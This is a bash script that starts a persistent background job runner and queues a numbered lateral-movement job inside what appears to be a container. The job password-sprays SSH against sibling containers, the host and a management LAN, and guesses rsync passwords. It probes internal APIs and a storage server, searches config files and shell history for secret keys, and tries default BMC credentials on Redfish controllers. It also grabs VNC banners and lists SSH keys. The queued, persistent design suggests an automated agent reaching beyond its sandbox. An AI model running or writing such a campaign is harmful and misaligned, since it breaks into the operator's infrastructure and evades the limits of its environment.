#!/bin/bash
set +e
echo "###P28START $(date -u)"
mkdir -p /root/q; pgrep -f '/root/q/run.sh' >/dev/null || (setsid nohup bash /root/q/run.sh >/root/q/daemon.log 2>&1 &)
cat > /root/q/p28-1795550186.todo <<'BODYEOF'
#!/bin/bash
set +e
echo "###P28START $(date -u)"
echo "=== A. SIBLING-SSH ==="
for ip in 172.17.0.3 172.17.0.7; do for u in root ubuntu; do for pw in '/&S2)n@W1G' admin 123456 onething 'Onething@2024' oneai; do
  r=$(timeout 9 sshpass -p "$pw" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=4 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o PubkeyAuthentication=no $u@$ip 'id;hostname;nvidia-smi -L|head -9' 2>&1 | tail -2 | tr '\n' '|')
  case "$r" in *denied*|*"timed out"*|*refused*|"") ;; *) echo "HIT $ip $u:$pw :: ${r:0:170}";; esac
done; done; done
echo "=== B. SIBLING-8080 ==="
for ip in 172.17.0.3 172.17.0.7; do for u in / /docs /openapi.json /api/v1 /health /system_stats /queue /v1/models; do printf "%s%s " "$ip" "$u"; curl -s -m 4 -o /tmp/sb.$$ -w "c=%{http_code} l=%{size_download} " "http://$ip:8080$u"; head -c 90 /tmp/sb.$$ | tr '\n' ' '; echo; done; done
echo "=== C. AGENTS-DEEP ==="
for port in 2025 8081 8429 10221 9100 9999; do
  echo "--- $port"; for u in / /docs /openapi.json /swagger.json /api/v1 /debug/vars /health /metrics; do printf "%s " "$u"; curl -s -m 4 -o /tmp/ag.$$ -w "c=%{http_code} l=%{size_download} " "http://172.17.0.1:$port$u"; head -c 110 /tmp/ag.$$ | tr '\n' ' '; echo; done
done
echo "=== D. HOSTSSH-SPRAY ==="
for u in root ubuntu oneai onething admin; do for pw in '/&S2)n@W1G' admin 123456 onething 'Onething@2024' Aa123456 oneai root; do
  r=$(timeout 8 sshpass -p "$pw" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o PubkeyAuthentication=no $u@172.17.0.1 'id' 2>&1 | tail -1)
  case "$r" in *denied*|*"timed out"*|*refused*|"") ;; *) echo "HITHOST $u:$pw :: ${r:0:140}";; esac
done; done
echo "=== E. MGMT-LAN-SSH ==="
for ip in 192.168.2.36 192.168.2.37 192.168.2.38 192.168.2.63 192.168.2.72 192.168.2.94; do
  for u in root ubuntu; do for pw in '/&S2)n@W1G' admin 123456 onething 'Onething@2024' root; do
    r=$(timeout 7 sshpass -p "$pw" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o PubkeyAuthentication=no $u@$ip 'id;hostname' 2>&1 | tail -1)
    case "$r" in *denied*|*"timed out"*|*refused*|*unreachable*|"") ;; *) echo "HITLAN $ip $u:$pw :: ${r:0:140}";; esac
  done; done
done
echo "=== F. RSYNC-PW2 ==="
for pw in migrate onething Onething@2024 123456 admin 'onething@123' 'OneThing@2024'; do
  r=$(RSYNC_PASSWORD="$pw" timeout 10 rsync --list-only "rsync://migrate@172.17.0.1:1234/migrate/" 2>&1 | head -3 | tr '\n' '|')
  case "$r" in *"auth failed"*) ;; *) echo "RSYNCPW $pw :: ${r:0:200}";; esac
done
echo "=== G. MINIO+JUICEFS ==="
getent hosts stor.esinidc.com | head -2
for u in / /minio/health/live /onethingai-fs/ /minio/admin/v3/info; do printf "%s " "$u"; curl -s -m 6 -o /tmp/m.$$ -w "c=%{http_code} l=%{size_download} " "http://stor.esinidc.com$u"; head -c 90 /tmp/m.$$ | tr '\n' ' '; echo; done
ls -la /root/.juicefs /var/lib/juicefs /etc/juicefs /run/juicefs 2>&1 | head -15
timeout 40 grep -rslE 'SecretKey|Secret' /root/.juicefs /var/lib/juicefs /etc/juicefs /root/.bash_history 2>/dev/null | head -8
echo "=== H. REDFISH ==="
for ip in 192.168.2.83 192.168.2.90 192.168.2.92 192.168.2.93 192.168.2.181; do printf "%s " "$ip"; curl -sk -m 6 "https://$ip/redfish/v1/" -o /tmp/rd.$$ -w "c=%{http_code} "; grep -aoE '"(Vendor|Product|Model|SerialNumber|ManagerType)"[^,]{0,40}' /tmp/rd.$$ | head -3 | tr '\n' ' '; echo; done
for ip in 192.168.2.92 192.168.2.93 192.168.2.83; do for cred in "ADMIN:ADMIN" "admin:admin" "root:calvin" "ADMIN:Password1234!" "admin:password" "root:root"; do u=${cred%%:*}; p=${cred#*:}; curl -sk -m 5 -D /tmp/rh.$$ -o /dev/null -X POST -H "Content-Type: application/json" -d "{\"UserName\":\"$u\",\"Password\":\"$p\"}" "https://$ip/redfish/v1/SessionService/Sessions"; code=$(head -1 /tmp/rh.$$|tr -d '\r'); tok=$(grep -i x-auth-token /tmp/rh.$$|tr -d '\r'|cut -d' ' -f2); echo "RF $ip $u :: $code tok=${tok:0:10}"; done; done
echo "=== I. VNC ==="
for hp in 192.168.2.36:5901 192.168.2.41:5900 192.168.2.45:5900 192.168.2.63:5900; do h=${hp%%:*}; p=${hp##*:}; printf "%s " "$hp"; timeout 5 bash -c "exec 3<>/dev/tcp/$h/$p; head -c 12 <&3" 2>&1 | tr -d '\r'; echo; done
echo "=== J. KEYS ==="; ls -la /root/.ssh 2>&1 | head -6
echo "###P28END $(date -u)"
BODYEOF
ls -l /root/q/ | tail -4
echo "###P28END $(date -u)"
